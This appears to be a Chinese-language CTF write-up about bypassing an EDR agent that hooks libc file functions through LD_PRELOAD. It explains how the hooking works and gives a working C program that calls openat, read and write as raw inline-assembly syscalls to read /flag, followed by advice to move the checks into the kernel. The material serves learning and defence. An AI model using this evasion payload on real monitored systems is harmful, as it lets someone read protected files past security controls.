### 内网渗透与高级社工-终端EDR绕过-G3

#### 题目

目标主机的终端检测响应（EDR）代理采用用户态 API 挂钩：在进程内劫持 libc 的文件访问封装（`open`/`openat`/`fopen` 等），对敏感文件的访问直接拒绝。运维程序改为提交 C 源码由主机编译执行。你需要写一段能绕过用户态 hook、读取 `/flag` 的程序。

#### 分析题目

看题目来说，主要是对敏感文件访问进行过滤。然后我进终端，发现改成写C语言了。

但是还有很多东西还看不懂，**让我学习一下**！

---

C语言执行代码时，会链接到代码对应的**so文件**，so文件中含有该句代码的实际执行逻辑（但执行层还是C语言，这只是一个工作流）。<u>可以理解为C语言编程中的代码，实际执行时往往需要**外包**给so文件中的代码。</u>

这题的EDR，**HOOK**了文件访问函数对应的so文件中的实际执行函数（<u>让他外包找错人</u>）。这样实际执行的代码就不是原生so文件中的文件访问代码，而是另一套自定义的逻辑（这里是加上了敏感文件过滤）。

下面让我来解释一下HOOK是什么意思：
看一个例子。C语言`fopen`函数实际执行需要链接到`libc.so`文件去找实际访问文件的函数，比如叫`open`（`open`只是一个标记，方便说明，实际上不是这个）。而它查找这个`open`，**是按名字查找的**，并且查到了就算找到了，即**以第一个为结果**。
通过配置环境变量`LD_PRELOAD`，可以指定"优先解析的so文件"；EDR的管理者先写入一个含有名为`open`函数的so文件`preload.so`，然后由环境变量指向它。这样C语言想要查找`open`这个函数的时候，就会先从`preload.so`开始找，并且在其中第一次找到`open`并结束。
从结果上看，EDR管理者就劫持了`open`函数，他可以通过`preload.so`自由修改`open`函数的逻辑，并以此影响任何链接到此函数的代码（包括C语言和其他语言）。

**`LD_PRELOAD`环境变量**只是一种劫持的方法，由于这里劫持已经成为结果，因此其他方法我不展开说明了。

补充说明，例子中提到的`链接到so文件`，是一种突出动作的说法。实际上关于"**我外包要找谁**"这个问题，可能发生在整段代码执行前，而不是用到了再去找外包。
另一种”用到了才去找外包“的情况，叫惰性绑定。——不过笼统一些方便理解。

---

总之，这题EDR劫持了文件访问函数全家，通过C语言`fopen`链接到的文件访问函数，是存在过滤的，不能这么做！

如果我们不能劫持回来，**那么就只能不用C语言的`fopen`了**。**我们深入一个层级，用C语言指挥系统直接访问文件**，不走上述外包路线。

#### 系统调用层

so文件中的那些逻辑，最终都是要调用系统的，从用户态深入到内核态，也就是与操作系统打交道。

那我们直接编写一些与操作系统打交道的C语言代码，不走以上逻辑即可。

这我当然是不会写，我让AI帮我写"一个C语言实现的直接系统调用访问指定文件的函数"。AI就会帮你全部写好。payload：

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>

static long raw(long nr, long a, long b, long c)
{//汇编写了一个
    long r;
    __asm__ volatile("syscall"
                     : "=a"(r)
                     : "a"(nr), "D"(a), "S"(b), "d"(c)
                     : "rcx", "r11", "memory");
    return r;
}

int main(void)
{
    char buf[4096];
    long fd = raw(SYS_openat, AT_FDCWD, (long)"/flag", O_RDONLY);
    if (fd < 0) {
        raw(SYS_write, 1, (long)"open failed\n", 12);
        return 1;
    }

    long n;
    while ((n = raw(SYS_read, fd, (long)buf, sizeof buf)) > 0)
        raw(SYS_write, 1, (long)buf, n);

    return 0;
}

```

#### 总结与防御建议

这题涉及到了编程语言从用户态传导到内核态的过程，即所有编程语言最终绕不开的so文件。虽然没有一步一步地把传导过程拆分清楚，但是初步的概念搭建起来了！并且说明了一种HOOK劫持so文件函数逻辑的办法（深一层，但是还是在用户态）。

关于防御建议，我跟AI聊，有一个角度很好：
被 hook 的代码和被保护的对象在**同一层级**

我的理解是保护点在同一层级，就会导致该保护点（检查点）并非必经之路。倘若把检查点设置在内核态，成为必经之路，那么就无法绕过检查，必须接受检查。
